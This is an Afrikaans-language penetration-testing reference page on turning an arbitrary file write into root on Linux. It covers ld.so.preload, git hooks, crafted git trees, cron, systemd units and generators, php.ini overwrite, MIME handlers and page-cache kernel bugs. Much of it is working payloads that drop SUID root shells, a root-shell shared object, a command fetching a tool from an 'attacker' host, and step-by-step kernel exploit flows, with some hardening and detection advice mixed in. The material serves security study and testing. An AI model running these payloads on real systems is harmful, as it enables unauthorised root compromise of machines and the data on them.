# Willekeurige lêerskryf na Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` is ’n stelselwye lys van shared objects wat die dinamiese skakelaar voor ander shared objects laai. Secure-execution mode pas bykomende beperkings op preloading toe, dus is ’n biblioteekpad soos `/tmp/pe.so` nie ’n universele SUID-binary-tegniek nie.\
As jy dit kan skep of wysig, sal ’n proses wat die lêer laai, die gelyste biblioteek voor sy ander shared objects laai, wat kode-uitvoering in daardie proses se konteks moontlik maak.<sup>[[12]](#references)</sup>

Byvoorbeeld: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### OCR-uitvoer as ’n beperkte lêfwerkskrywing

’n OCR-diens wat ’n oproeper die gestoorde lêernaam laat kies, kan herkende beeldteks in ’n **beperkte lêfwerkskryf-primitive** omskep. Die gestoorde grepe is die herkende teks, nie die beeldgrepe nie; kyk dus na die OCR-uitvoer vir sintaksfoute. As die toegelate bestemming web-uitvoerbaar is en ’n `.php`-lêernaam toelaat, kan daardie teks uitgevoer word wanneer dit aangevra word. In MakeSense het ’n plaaslik bereikbare OCR-toepassing die teks onder `/saved/` gestoor; sy PHP-bediener, wat as root geloop het, het toe die gestoorde lêer as root uitgevoer. Die skryfbewerking was tot daardie gids beperk, sonder gedemonstreerde padtraversering.<sup>[[37]](#references)</sup>

Die voorregte wat met uitvoering verkry word, is dié van die **PHP-bedienerproses**, nie outomaties dié van die OCR-skrywer nie. Bevestig die bestemmings se uitvoerkartering en die runtime-identiteit; ’n OCR-skrywer wat as root loop, saam met ’n onbevoorregte webbediener, sal nie veroorsaak dat die PHP as root loop nie.<sup>[[37]](#references)</sup> Vergelyk die direkte [web-root-oplaaipatroon](../../pentesting-web/file-upload/).

### Git hooks

**Git hooks** is uitvoerbare skripte wat vir gebeurtenisse in ’n repository loop, insluitend commit- en merge-bewerkings. As ’n **bevoorregte skrip of gebruiker** daardie bewerkings uitvoer en ’n aanvaller in die **`.git`-gids kan skryf**, kan die hook vir **voorregte-eskalasie** gebruik word.<sup>[[13]](#references)</sup>

Dit is byvoorbeeld moontlik om ’n **skrip te genereer** in ’n git-repo in **`.git/hooks`**, sodat dit altyd uitgevoer word wanneer ’n nuwe commit geskep word:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Bevoorregte Git-tree-uitvoer-padtraversering

’n Bevoorregte synchroniseerder kan ’n checkout vermy en eerder ’n aanvallerbeïnvloede repository met `git ls-tree` lys, elke blob met `git cat-file` lees, die gerapporteerde padnaam by ’n staging-gids voeg en dit self skryf. Dit word ’n **arbitrary file write met die synchroniseerder se voorregte** wanneer dit `-c safe.directory=*` (wat Git se beskerming vir repositories met ’n ander eienaar deaktiveer) kombineer met geen kontrole om te verseker dat die bestemming binne die staging-gids bly nie. ’n Absolute boominskrywingsnaam laat Python se `os.path.join(stage, name)` die `stage` weggooi; ’n relatiewe naam met `../` ontsnap wanneer die lêerstelsel dit oplos. Omdat die toepassing die rou boom materialiseer eerder as om Git dit te laat uitcheck, beskerm die padnaamverwerping tydens checkout nooit die sink nie.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Soek na hierdie kodevorm in root-dienste, timers, ontplooiingsagente, sjablooninvoerders en rugsteun-/herstelwerk:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

’n Tree-inskrywing word geënkodeer as `<mode> SP <name> NUL <raw object ID>`. Die `git hash-object --literally`-opsie laat doelbewus objekdata toe wat normale ontleding of `git fsck` moontlik sal verwerp, sodat ’n tydelike kloon ’n tree kan skep waarvan die lêernaam ’n absolute bestemming is. Hierdie voorbeeld skep ’n cron-lêerblob, vou die vervaardigde tree in ’n commit toe en skuif ’n tak daarheen; uitbuiting vereis steeds toestemming om ’n repository by te werk wat deur die bevoorregte taak gebruik word, asook ’n Git-bediener wat die misvormde objek aanvaar.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Verharding moet sowel die inname van repositories as die finale lêerstelselbewerking dek:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Vervang `safe.directory=*` met die presiese repositories wat die diens moet vertrou, en verwerk repositories waar moontlik sonder root-voorregte.
- Verwerp absolute name en enige `.`- of `..`-komponent voordat materialisering plaasvind. Nadat die pad saamgevoeg is, kanoniseer dit en verifieer dat die bestemming binne die bedoelde wortel bly.
- Vermy simboliese-skakel-resies tussen kontrole en opening: open relatief tot ’n vertroude gidsbeskrywer en gebruik op Linux `openat2()` met `RESOLVE_BENEATH` plus `RESOLVE_NO_SYMLINKS` vir aanvallerbeheerde paaie.
- Verkies ’n gewone checkout in ’n geïsoleerde gids bo die herimplementering van checkout uit plumbing-uitvoer. As inname van rou objects nodig is, aktiveer validering aan die ontvangkant, soos `receive.fsckObjects=true`; moenie die padnaamverwante `receive.fsck.*`-bevindings afgradeer wat nodig is om vervaardigde bome te verwerp nie.

### Ontplooiing van bevoorregte konfigurasie

Sommige bestuursdienste stoor die beoogde stelseltoestand in ’n konfigurasielêer en ontplooi dit later met verhoogde voorregte. Byvoorbeeld, [openmediavault stoor konfigurasie in `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), en sy [RPC-koppelvlak](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) kan diensveranderinge toepas. As ’n rekening met laer voorregte daardie lêer kan skryf of vervang, ondersoek of dit ook ’n gemagtigde ontplooiing kan versoek en of die gekose module die veranderde veld as root verwerk. SSH-rekeningsleutels, geskeduleerde opdragte en pakketinstallasie het elk verskillende vereistes; die blote teenwoordigheid van ’n lêer of ’n skryfbare XML-lêer bewys nie dat enige hiervan moontlik is nie. Gaan die lêer- en ouergidsvoorregte, die oproeper se groepe en RPC-magtiging, die geïnstalleerde weergawe en die werklike verbruiker na, sonder om die konfigurasie te wysig of ’n toepasbewerking tydens inventarisering aan te roep.

Fail2Ban-aksiedefinisies onder `/etc/fail2ban/action.d/` is nog ’n grens vir bevoorregte konfigurasie. ’n Gebruiker wat daardie gids kan skryf en deursoek, kan moontlik ’n aksiedefinisie vervang of ’n oorheersing byvoeg, maar gidstoestemmings alleen bewys nie kode-uitvoering nie. Bevestig dat ’n geaktiveerde jail inderdaad die betrokke aksie kies, dat die Fail2Ban-diens dit met hoër voorregte uitvoer, en dat ’n gemagtigde herlaai/herbegin plus ’n ooreenstemmende ban-gebeurtenis sal plaasvind. ’n Irrelevante sudo-toestemming om Fail2Ban te herbegin, is slegs ter sake wanneer dit op die presiese diensaanroep van toepassing is en die veranderde definisie gelaai word. [Fail2Ban se aksiekonfigurasie](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) dokumenteer die verband tussen die aksiegids en jail; die [voorbeeldaksie](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) wys dat `actionban` tydens ’n ban met die diensgebruiker se regte loop. Inspekteer toestemmings en die effektiewe konfigurasie sonder om aksies te verander of bans tydens inventarisering te aktiveer.

’n Afsonderlike grens bestaan wanneer ’n geaktiveerde Fail2Ban-jail ’n WHOIS-verrykte e-posaksie gebruik. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) het onvertroude WHOIS-teks behels wat na GNU mailutils `mail` gestuur is, waarvan die ontsnappingsverwerking ’n opdrag kon uitvoer. ’n Lêerskrywer met laer voorregte kan die antwoord beïnvloed as dit die konfigurasie vir bedieneroorheersing van die **gekose WHOIS-kliënt** kan verander; [Debian se `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) dokumenteer een so ’n lêer, maar die pad en gebruik daarvan verskil per installasie. Ondersoek die effektiewe jail/aksie, diensidentiteit, werklike WHOIS-kliënt en konfigurasiepad, posimplementering, beheer oor die antwoord en geïnstalleerde verskafferregstelling of backport. ’n Skryfbare WHOIS-konfigurasielêer, ’n Fail2Ban-weergawe of ’n e-posaksie alleen bewys nie hierdie ketting nie; vermy navrae aan ’n eksterne bediener of die aktivering van bans tydens passiewe inventarisering.

### TFTP-lêerskepping en bevoorregte pakkethake

’n Toeganklike TFTP-diens kan ’n houer- of plaaslikegebruikergrens oorsteek wanneer sy **effektiewe** tftpd-hpa-instellings as root loop, die lêerstelselwortel as die `--secure`-gids blootstel en `--create` aktiveer. [Die tftpd-hpa-handleiding](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) beskryf die skeppings- en gebruikeropsies. Dit is ’n moontlike manier om ’n nuwe lêer in ’n bevoorregte konfigurasiegids te skep, insluitend `/etc/apt/apt.conf.d/`; ’n bestaande lêer kan steeds vervanging weerstaan. [APT se konfigurasiehandleiding](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) dokumenteer `APT::Update::Pre-Invoke`-opdragte. ’n `apt update` wat as root loop, kan die verbruiker met hoër voorregte word **slegs as** dit die nuwe konfigurasielêer lees. Bevestig die lopende daemon se werklike argumente en identiteit, netwerkbereikbaarheid en filtering, die beleid vir die skep van teikengidse, APT se effektiewe konfigurasieomvang en ’n latere bevoorregte aanroep. ’n Standaardlêer, skryfbare teikengids of geskeduleerde APT-opdrag alleen bewys nie die volledige roete nie. Passiewe triage moet slegs begrensde plaaslike konfigurasie en metadata lees, sonder om ’n lêer op te laai of APT aan te roep.

### Cron- en tydlêers

As jy **cron-verwante lêers kan skryf wat root uitvoer**, kan jy gewoonlik kode-uitvoering kry wanneer die taak die volgende keer loop. Interessante teikens sluit in:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root se eie crontab in `/var/spool/cron/` of `/var/spool/cron/crontabs/`
- `systemd`-timers en die dienste wat hulle aktiveer

Vinnige kontroles:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Tipiese misbruikroetes:

- **Voeg ’n nuwe root-cron-taak by** in `/etc/crontab` of ’n lêer in `/etc/cron.d/`
- **Vervang ’n script** wat reeds deur `run-parts` uitgevoer word
- **Plaas ’n backdoor in ’n bestaande timer-teiken** deur die script of binary wat dit begin, te wysig

Minimale cron-payload-voorbeeld:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

As jy net binne ’n cron-gids kan skryf wat deur run-parts gebruik word, plaas eerder ’n uitvoerbare lêer daar:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notas:

- `run-parts` ignoreer gewoonlik lêername wat punte bevat, dus verkies name soos `backup` eerder as `backup.sh`.<sup>[[15]](#references)</sup>
- Sommige stelsels gebruik `systemd`-timers in plaas van klassieke cron, maar die misbruikidee is dieselfde: **wysig wat root later sal uitvoer**.<sup>[[20]](#references)</sup>

### Diens- en Socket-lêers

As jy **`systemd`-unitlêers** of lêers waarna hulle verwys kan skryf, kan jy dalk code execution as root kry deur die unit te herlaai en te herbegin, of deur te wag totdat die diens-/socket-aktiveringspad geaktiveer word.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Kontroleer ook skryf- en soektoegang tot die stelsel se unit-gids self, insluitend ACL's: ’n gebruiker kan ’n nuwe unit in `/etc/systemd/system` skep, selfs wanneer leestoegang/lysregte op die gids geweier word. Daardie pad alleen begin niks nie. Bevestig dat die stelselbestuurder die nuwe unit sal laai, dat die oproeper ’n effektiewe root-bevoegde `systemctl start`- of `restart`-toestemming vir die naam het (of ’n ander bevoorregte aktiveringspad), en dat die diens as die bedoelde identiteit loop. ’n Bestaande unit wat reeds gelaai is en op skyf verander word, kan `daemon-reload` vereis; ’n unit met ’n nuwe naam het ander laaigedrag. Gaan die presiese sudo-argumente en uitsluitings na voordat jy ’n jokerteken-herbeginreël as voldoende beskou. Sien die [systemd-unit-soekpad](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) en [systemctl-laai- en herlaaisemantiek](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Interessante teikens sluit in:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in-oorskrywings in `/etc/systemd/system/<unit>.d/*.conf`
- Diensskrifte/binêre lêers waarna `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` verwys
- Skryfbare `EnvironmentFile=`-paaie wat deur ’n root-diens gelaai word

Vinnige kontroles:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Algemene misbruikpaaie:

- **Oorskryf `ExecStart=`** in ’n service unit wat deur root besit word en wat jy kan wysig
- **Voeg ’n drop-in override by** met ’n kwaadwillige `ExecStart=` en maak eers die ou een skoon
- **Plaas ’n backdoor in die script/binary** waarna die unit reeds verwys
- **Kaper ’n socket-activated service** deur die ooreenstemmende `.service`-lêer te wysig wat begin wanneer die socket ’n verbinding ontvang

Voorbeeld van ’n kwaadwillige override:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Tipiese aktiveringsvloei:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

As jy nie self dienste kan herbegin nie, maar wel ’n socket-activated unit kan wysig, hoef jy dalk net **vir ’n kliëntverbinding te wag** om die backdoored diens as root te laat uitvoer.<sup>[[17]](#references)</sup>

### systemd generator-gidse

**System generators** is uitvoerbare programme wat deur die stelselbestuurder geloods word voordat dit unit-lêers laai, tydens sowel selflaai as konfigurasieherlaai. Daarom is skryftoegang tot ’n system-generator-gids (of tot ’n bestaande uitvoerbare generator) ’n direkte primitive vir kode-uitvoering as root wat maklik misgekyk word wanneer ’n oudit net `*.service`- en `*.timer`-lêers nagaan.<sup>[[35]](#references)[[36]](#references)</sup>

Die gewone soekvolgorde is `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` en `/usr/lib/systemd/system-generators/` (sommige verspreidings stel `/lib/systemd/system-generators/` deur die `/usr`-samevoeging beskikbaar). ’n Uitvoerbare program met dieselfde naam in ’n vroeër gids skadu die een in ’n latere gids. Moenie hierdie **invoer-uitvoerbare gidse** verwar met `/run/systemd/generator`, `/run/systemd/generator.early` en `/run/systemd/generator.late` nie; dié bevat tydelike unit-uitvoer wat deur generators geskep word.<sup>[[35]](#references)</sup>

Vinnige kontroles:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

’n Nuutgeskepte generator moet sy uitvoerbare bit gestel hê. As die write primitive grepe beheer maar nie die modus nie, teiken ’n reeds uitvoerbare generator; as jy dit in plek afkap, bly die metadata gewoonlik behoue. As die gids self skryfbaar is, skep ’n nuwe inskrywing en merk dit as uitvoerbaar.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Deur `systemctl daemon-reload` teen die **system**-bestuurder uit te voer, vereis gepaste magtiging, maar dit voer elke system-generator weer uit; wag andersins vir ’n bevoorregte reload, pakketbewerking of herlaai. User-generator-gidse soos `~/.config/systemd/user-generators/` word onder die user-bestuurder uitgevoer en verskaf **nie** op hul eie root nie.<sup>[[35]](#references)</sup>

Vir hardening en hunting, verifieer elke padkomponent en ACL, nie net die finale modusbits nie; stel basislyn-hashes en pakket-eienaarskap van generators vas, en aktiveer waarskuwings oor skep-, hernoem-, inhoud- of toestemmingsveranderinge in alle stelsels se generator-invoergidse. Dit is belangrik om die skryfaksie te monitor, omdat ’n eenmalige generator homself ná uitvoering kan uitvee, terwyl die gegenereerde eenheidstruktuur onder `/run/systemd/generator*` met die volgende reload herbou word.<sup>[[35]](#references)[[36]](#references)</sup>

### Oorskryf ’n beperkende `php.ini` wat deur ’n bevoorregte PHP-sandbox gebruik word

Sommige pasgemaakte daemons valideer PHP wat deur gebruikers verskaf is deur `php` met ’n **beperkte `php.ini`** uit te voer (byvoorbeeld, `disable_functions=exec,system,...`). As die sandbox-kode steeds **enige skryfprimitief** het (soos `file_put_contents`) en jy toegang het tot die **presiese `php.ini`-pad** wat deur die daemon gebruik word, kan jy **daardie konfigurasie oorskryf** om beperkings op te hef en dan ’n tweede payload indien wat met verhoogde voorregte loop.<sup>[[2]](#references)</sup>

Tipiese verloop:

1. Die eerste payload oorskryf die sandbox-konfigurasie.
2. Die tweede payload voer kode uit noudat gevaarlike funksies weer geaktiveer is.

Minimale voorbeeld (vervang die pad wat deur die daemon gebruik word):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

As die daemon as root loop (of met root-besitte paaie valideer), lewer die tweede uitvoering ’n root-konteks. Dit is in wese **privilege escalation via config overwrite** wanneer die sandboxed runtime steeds lêers kan skryf.

### binfmt_misc

`binfmt_misc` stel registrasies beskikbaar onder `/proc/sys/fs/binfmt_misc`; elke registrasie koppel ’n lêertipepatroon aan ’n interpreter. Die impak op privileges hang af van wie die registrasie kan verander en watter proses later die lêer uitvoer wat daarmee ooreenstem. Verifieer dus hierdie vereistes voordat jy dit as ’n privilege-escalation-pad beskou.<sup>[[21]](#references)</sup>

’n Uitvoerbare helper met `CAP_DAC_OVERRIDE` kan ’n afsonderlike registrasiepad bied as dit data aanvaar wat deur die caller beheer word en dit na `/proc/sys/fs/binfmt_misc/register` skryf, selfs wanneer die caller nie direk na daardie nodus kan skryf nie. Gaan die helper se invoer- en skryfgedrag na sonder om dit tydens die enumerasie uit te voer. As ’n geregistreerde reël die `C`-vlag gebruik, ontvang die interpreter credentials wat op die ooreenstemmende binary gebaseer is; ’n SUID-teiken wat deur root besit word, kan dus ’n interpreter wat deur die caller beheer word as root uitvoer. Bevestig die `binfmt_misc`-mount en registrasiebeleid, die helper se effektiewe capability, die presiese reël en interpreter-pad, die uitvoerbare SUID-teiken, en of `no_new_privs` of ’n `nosuid`-mount die SUID-oorgang onderdruk. ’n Capability-bit of ingebedde padstring is op sigself slegs ’n leidraad vir verdere ondersoek.<sup>[[21]](#references)</sup> Sien [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) vir voorwaardes wat SUID-onderdrukking veroorsaak.

### Oorskryf van skemahanteringsprogramme (soos http: of https:)

Werkskermomgewings gebruik MIME-assosiasies en desktop entries om ’n toepassing vir URI-skemas te kies; ’n aanvaller wat die betrokke per-user-konfigurasie- en desktop-entry-gidse kan skryf, kan daardie skemas herlei na ’n launcher wat hulle beheer. Deur die `$HOME/.config/mimeapps.list`-lêer te wysig om HTTP- en HTTPS-URL-hanteerders na ’n kwaadwillige lêer te laat wys (byvoorbeeld `x-scheme-handler/http=evil.desktop` en `x-scheme-handler/https=evil.desktop`), kan ’n gebruikersklik daardie desktop entry aanroep.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root wat gebruikerdeur-skryfbare scripts/binaries uitvoer

As ’n bevoorregte werkvloei iets soos `/bin/sh /home/username/.../script` uitvoer (of enige binary binne ’n gids wat aan ’n onbevoorregte gebruiker behoort), kan jy dit kaap:<sup>[[1]](#references)</sup>

- **Bespeur die uitvoering:** monitor prosesse met pspy om te sien wanneer root gebruikerbeheerde paaie aanroep.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Bevestig skryfbaarheid:** maak seker dat beide die teikenlêer en sy gids deur jou gebruiker besit en geskryf kan word.
- **Kaping van die teiken:** maak ’n rugsteun van die oorspronklike binary/script en plaas ’n payload wat ’n SUID-shell skep (of enige ander root-aksie uitvoer), en herstel dan die toestemmings:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Aktiveer die bevoorregte aksie** (bv. deur ’n UI-knoppie te druk wat die helper laat loop). Wanneer root die gekaapte pad weer uitvoer, kry die eskaleerde shell met `./rootshell -p`.

### Page-cache-only-lêerwysiging van bevoorregte binaries

Sommige kernel-bugs wysig nie die lêer **op skyf** nie. In plaas daarvan laat hulle jou toe om slegs die **page cache-kopie** van ’n leesbare lêer te wysig. As jy ’n **setuid**- of andersins **root-uitgevoerde** binary kan teiken, kan die volgende uitvoering aanvallerbeheerde grepe uit die geheue laat loop en voorregte eskaleer, al het die lêer se hash op skyf nie verander nie.<sup>[[3]](#references)[[4]](#references)</sup>

Dit is nuttig om hieraan te dink as ’n **runtime-only-lêerskryfprimitief**:<sup>[[3]](#references)</sup>

- **Die skyf bly skoon**: die inode en grepe op skyf verander nie
- **Die geheue is vuil**: prosesse wat die gekaste bladsy lees/uitvoer, kry die inhoud wat die aanvaller gewysig het
- **Die effek is tydelik**: die verandering verdwyn ná ’n herlaai of cache-uitwerping

Hierdie primitief lê tussen klassieke **arbitrêre lêerskryf** en ouer **page-cache-misbruik**-bugs soos Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW het op ’n race staatgemaak
- Dirty Pipe het beperkings op die skryfposisie gehad
- ’n Page-cache-only-primitief kan meer betroubaar wees as die kwesbare pad direk skrywings na lêerondersteunde bladsye in die cache toelaat

#### Generiese privesc-vloei

1. Kry ’n kernel-primitief wat na **lêerondersteunde page-cache-bladsye** kan skryf
2. Gebruik dit teen ’n **leesbare bevoorregte binary** of ’n ander root-uitgevoerde lêer
3. Laat dit uitvoer **voordat** die bladsy uit die cache verwyder word
4. Kry kode-uitvoering as root terwyl die lêer op skyf steeds onveranderd lyk

Tipiese teikens met hoë waarde:

- **setuid-root**-binaries
- Helpers wat deur **root-dienste** geloods word
- Binaries wat algemeen uitgevoer word vanaf **containers wat die host-kernel/page cache deel**

#### AF_ALG + `splice()`-voorbeeldpad

Copy Fail (CVE-2026-31431) is ’n goeie voorbeeld van hierdie klas. Die kwesbare pad was in die Linux-crypto-gebruikersruimte-API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` kan verwysings na page-cache-bladsye van ’n leesbare lêer na die crypto TX scatterlist verskuif
- die in-place `algif_aead`-dekripteerpad het die bron- en bestemmingsbuffers hergebruik
- `authencesn` het daarna na die bestemming se tag-area geskryf
- wanneer daardie area steeds na gesplicede lêerondersteunde bladsye verwys het, het die skryfbewerking in die **page cache van die teikenlêer** beland

Die interessante tegniek is dus nie die CVE self nie, maar die patroon:

- **voer lêerondersteunde cache-bladsye na ’n kernel-substelsel**
- laat die substelsel hulle **as skryfbare uitvoer** behandel
- veroorsaak ’n klein, beheerde oorskrywing in die geheue

Die openbare PoC het herhaalde **4-greep-skrywings** gebruik om `/usr/bin/su` in die geheue te patch en dit toe uitgevoer.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE-kloon-voorbeeldpad

DirtyClone (CVE-2026-43503) wys ’n ander variant van dieselfde **page-cache-only-skryf-na-root**-patroon, maar hierdie keer is die sink **IPsec ESP-dekriptering** in plaas van `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Die belangrike tegniek is die **metadata-laundering-stap**:

- `splice()` plaas ’n **leesalleen-lêerondersteunde page-cache-bladsy** in ’n ESP-in-UDP-pakket
- die oorspronklike DirtyFrag-versagting het daardie skb met `SKBFL_SHARED_FRAG` gemerk sodat `esp_input()` **moes kopieer voordat dit dekripteer**
- netfilter `TEE` dupliseer die pakket via `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- die kloon behou dieselfde **fisiese page-cache-verwysing**, maar verloor `SKBFL_SHARED_FRAG`
- `esp_input()` behandel die kloon dan as veilig en voer **in-place `cbc(aes)`-dekriptering** op die lêerondersteunde bladsy uit

Die les vir beoordelaars strek dus verder as die CVE: as ’n versagting op **skb-/bladsy-metadata** staatmaak om te besluit of ’n bewerking eers moet kopieer, kan enige **kloon-/kopieerpad wat die ondersteunende bladsy behou maar die metadata weglaat** die skryfprimitief ongemerk weer oopstel.

Tipiese uitbuitingsvloei:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` om **`CAP_NET_ADMIN` binne ’n private netwerknaamruimte** te verkry
2. bring loopback op en installeer ’n **netfilter `TEE`-reël** in `mangle/OUTPUT`
3. installeer **XFRM ESP-transport-SAs** via `NETLINK_XFRM`
4. enkodeer elke teikenwoord van 4 grepe in die SA `seq_hi`-veld (DirtyFrag se woordkeuse-truuk)
5. stuur die gesplicede ESP-in-UDP-pakket sodat die **TEE-kloon** `esp_input()` bereik en **in-place** dekripteer
6. herhaal totdat die page-cache-kopie van `/usr/bin/su` of ’n ander bevoorregte uitvoerbare lêer aanvallerbeheerde kode bevat

Wat die werking betref, is die impak dieselfde as in die `AF_ALG`-voorbeeld: die lêer op skyf bly skoon, maar `execve()` gebruik die **gewysigde page-cache-grepe** en lewer root.<sup>[[8]](#references)[[9]](#references)</sup>

Nuttige blootstellingskontroles vir hierdie variant:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Korttermynvermindering van die aanvaloppervlak is ook hier padspesifiek: opgradering na ’n kernel met `48f6a5356a33` herstel die clone-pad, terwyl die blokkering van `xt_TEE`-autoload die **flag-laundering step** verwyder en die blokkering van `esp4` / `esp6` die **decrypt sink** verwyder.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Blootstelling en hunting

As jy hierdie soort fout vermoed, moenie net op skyfintegriteitskontroles staatmaak nie. Verifieer ook:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Die konfigurasiewaardes hieronder onderskei ’n laaibare koppelvlak van een wat in die kernel ingebou is; die crypto-boureëls koppel `CONFIG_CRYPTO_USER_API_AEAD` aan `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kan as ’n module gelaai/ontlaai word
- `CONFIG_CRYPTO_USER_API_AEAD=y`: die koppelvlak is in die kernel ingebou
- setuid binaries is goeie teikens omdat ’n pleister wat slegs die page cache wysig, genoeg kan wees om ’n plaaslike vastrapplek in root te verander

#### Aanvalsoppervlakvermindering vir die `algif_aead`-roete

As die kwesbare koppelvlak deur ’n laaibare module verskaf word:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

As dit in die kernel ingebou is, het sommige onthullings berig dat dit die init-pad blokkeer met:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

